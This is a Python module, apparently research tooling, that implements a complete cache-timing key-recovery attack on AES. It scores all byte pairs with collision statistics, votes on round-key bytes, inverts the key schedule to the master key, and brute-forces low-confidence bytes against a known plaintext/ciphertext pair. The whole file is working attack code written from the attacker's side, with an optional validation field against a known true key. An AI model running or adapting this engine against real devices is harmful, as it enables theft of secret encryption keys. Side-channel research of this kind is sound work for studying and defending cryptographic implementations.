"""Unified flash-timing key-recovery engine.

One config-driven last-round cache-collision attack over:
  * direction 'enc'  -> attacker knows the AES *encrypt* output block (ciphertext
                        / CBC block / CTR keystream); predictor uses inv S-box;
                        recovers the LAST round key.
  * direction 'dec'  -> attacker knows the AES *decrypt* output block (InvCipher
                        of the ciphertext); predictor uses the forward S-box;
                        recovers the FIRST round key.
  * keysize 128/192/256 (round-key -> master via aesref.invert_key_schedule).

Robustness (the key improvement over the old per-script attacks):
  * scans all C(16,2)=120 output-byte pairs, layout-agnostic;
  * assembles each key byte by a MARGIN-WEIGHTED VOTE across all 15 pairs that
    touch it (not first-pair-wins), so one bad pair cannot corrupt a byte;
  * keeps a ranked candidate list per byte and, if a known plaintext/ciphertext
    pair is supplied, VERIFIES the assembled key and BRUTE-FORCES the few lowest-
    confidence bytes over their top candidates until it verifies -- turning the
    old 13/16 and 15/16 near-misses into exact recovery.
"""
from __future__ import annotations
from dataclasses import dataclass, field
from itertools import product
import numpy as np
from . import aesref

SBOX = aesref.SBOX.astype(np.int64)
SINV = aesref.SINV.astype(np.int64)


_BASE = np.arange(256)
_NIB_CACHE = {}

def _nib(tbl):
    """NB[g, x] = high nibble of tbl[x ^ g]; cached per table."""
    key = tbl.ctypes.data
    NB = _NIB_CACHE.get(key)
    if NB is None:
        NB = (tbl[_BASE[None, :] ^ _BASE[:, None]] >> 4).astype(np.intp)  # (256 g, 256 x)
        _NIB_CACHE[key] = NB
    return NB

def col_attack_scored(ba, bb, y, tbl):
    """Best (ga,gb) minimising mean time on the predicted top-nibble-collision
    set, and a margin (how far below the mean score the winner sits, in std
    units). `tbl` = SINV (enc direction) or SBOX (dec direction). Vectorised over
    the inner (gb) guess for speed."""
    ba = np.asarray(ba, np.int64); bb = np.asarray(bb, np.int64)
    Ssum = np.zeros((256, 256)); Scnt = np.zeros((256, 256))
    np.add.at(Ssum, (ba, bb), y); np.add.at(Scnt, (ba, bb), 1.0)
    NB = _nib(tbl)                                   # (256, 256)
    scores = np.full((256, 256), np.nan)
    for ga in range(256):
        na = NB[ga]                                  # (256,) nibble per x_a
        Rs = np.zeros((16, 256)); Rc = np.zeros((16, 256))
        np.add.at(Rs, na, Ssum)                      # sum rows into nibble bins -> Rs[nib, x_b]
        np.add.at(Rc, na, Scnt)
        num = Rs[NB, _BASE[None, :]].sum(axis=1)     # for every gb at once -> (256,)
        den = Rc[NB, _BASE[None, :]].sum(axis=1)
        with np.errstate(invalid="ignore", divide="ignore"):
            scores[ga] = np.where(den > 0, num / den, np.nan)
    flat = scores[np.isfinite(scores)]
    bi = int(np.nanargmin(scores)); ga, gb = divmod(bi, 256)
    margin = (flat.mean() - scores[ga, gb]) / (flat.std() + 1e-12)
    return ga, gb, float(margin)


@dataclass
class Result:
    direction: str
    keysize: int
    roundkey: bytes                      # recovered round key (last for enc, first for dec)
    which: str                           # 'last' or 'first'
    roundkey_index: int                  # global round index of the recovered key
    confidence: list                     # per-byte vote margin (0..)
    candidates: list                     # per-byte ranked list of (byteval, weight)
    master: bytes | None = None
    verified: bool | None = None
    bruteforced: list = field(default_factory=list)   # positions fixed by brute force
    truth_correct: int | None = None     # bytes matching a supplied truth (validation only)

    def summary(self):
        s = [f"{self.direction} AES-{self.keysize}: round key rk[{self.roundkey_index}] "
             f"({self.which}) = {self.roundkey.hex()}"]
        if self.master is not None:
            s.append(f"master = {self.master.hex()}  verified={self.verified}"
                     + (f"  brute-forced positions {self.bruteforced}" if self.bruteforced else ""))
        elif self.keysize != 128:
            s.append(f"(AES-{self.keysize}: master needs the last two round keys; this attack "
                     f"gives rk[{self.roundkey_index}] only -- combine with a second round key "
                     f"via master_from_results, or see docs on the second-round attack)")
        if self.truth_correct is not None:
            s.append(f"round-key bytes correct vs truth: {self.truth_correct}/16")
        return "\n".join(s)


def master_from_results(results, keysize):
    """Invert to the master key given several recover() Results whose recovered
    round keys together cover the last Nk schedule words (AES-192/256)."""
    rks = {r.roundkey_index: r.roundkey for r in results}
    return aesref.invert_from_roundkeys(rks, keysize)


def _roundkey_to_master(rkbytes, direction, keysize):
    """Assemble the master key from the recovered round key, when one round key
    is sufficient (AES-128: last key inverts, first key IS the master). For
    192/256 a single round key is not enough (needs multi-round recovery); returns
    None with which-info left to the caller."""
    if keysize == 128:
        if direction == "dec":
            return bytes(rkbytes)                    # first round key = master
        return aesref.invert_key_schedule(list(rkbytes), 128)
    return None                                      # 192/256: single round key insufficient


def recover(known_blocks, timing, *, direction="enc", keysize=128,
            verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None):
    """Recover the key from (known block-cipher output blocks, timing).

    known_blocks : (N,16) uint8 -- the AES *output* block the attacker knows.
    timing       : (N,) float   -- per-trace timing (any monotone oracle).
    verify       : optional (pt, ct) bytes pair under the target key; enables
                   verification + brute-force of low-confidence bytes.
    truth        : optional true round key bytes, for validation only.
    """
    known = np.asarray(known_blocks, np.int64)
    y = np.asarray(timing, float); y = y - y.mean()
    tbl = SINV if direction == "enc" else SBOX

    votes = np.zeros((16, 256))
    for a in range(16):
        for b in range(a + 1, 16):
            ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl)
            if mg > 0:
                votes[a, ga] += mg
                votes[b, gb] += mg
        if log:
            log(f"  scanned pairs for byte {a}")

    order = np.argsort(-votes, axis=1)
    roundkey = bytes(int(order[i, 0]) for i in range(16))
    conf = []
    candidates = []
    for i in range(16):
        top = votes[i, order[i, 0]]; second = votes[i, order[i, 1]]
        conf.append(float(top - second))
        candidates.append([(int(order[i, j]), float(votes[i, order[i, j]])) for j in range(cand_per_pos)])

    Nr = {128: 10, 192: 12, 256: 14}[keysize]
    res = Result(direction=direction, keysize=keysize, roundkey=roundkey,
                 which=("first" if direction == "dec" else "last"),
                 roundkey_index=(0 if direction == "dec" else Nr),
                 confidence=conf, candidates=candidates)
    if truth is not None:
        res.truth_correct = sum(roundkey[i] == truth[i] for i in range(16))

    master = _roundkey_to_master(roundkey, direction, keysize)
    res.master = master

    if verify is not None and keysize == 128:
        pt = np.frombuffer(verify[0], np.uint8)[None, :]; ct = bytes(verify[1])
        def master_from(rk):
            return bytes(rk) if direction == "dec" else aesref.invert_key_schedule(list(rk), 128)
        def ok(mk):
            return aesref.encrypt_blocks(mk, np.asarray(pt))[0].tobytes() == ct
        if master is not None and ok(master):
            res.verified = True
            return res
        # Rank positions by confidence; brute-force the weakest FULL-range (0..255),
        # not just their top vote candidates (a no-signal byte may not be in them).
        weak_order = sorted(range(16), key=lambda i: conf[i])
        L = 0
        while L < min(max_bruteforce, 16) and 256 ** (L + 1) <= 256 ** 2:   # default budget: <=2 full bytes
            L += 1
        subset = weak_order[:max(L, 1)]
        found = None
        for k in range(1, len(subset) + 1):
            positions = subset[:k]
            for combo in product(range(256), repeat=k):
                rk = bytearray(roundkey)
                for pos, val in zip(positions, combo):
                    rk[pos] = val
                mk = master_from(rk)
                if ok(mk):
                    found = (mk, list(positions)); break
            if found:
                break
        if found:
            res.master = found[0]
            res.bruteforced = found[1]
            res.roundkey = bytes(aesref.key_expansion(found[0])[0] if direction == "dec"
                                 else aesref.key_expansion(found[0])[-1])
            res.verified = True
        else:
            res.verified = False
    return res


def _rk_last_from_master(master):
    return bytes(aesref.key_expansion(master)[-1])
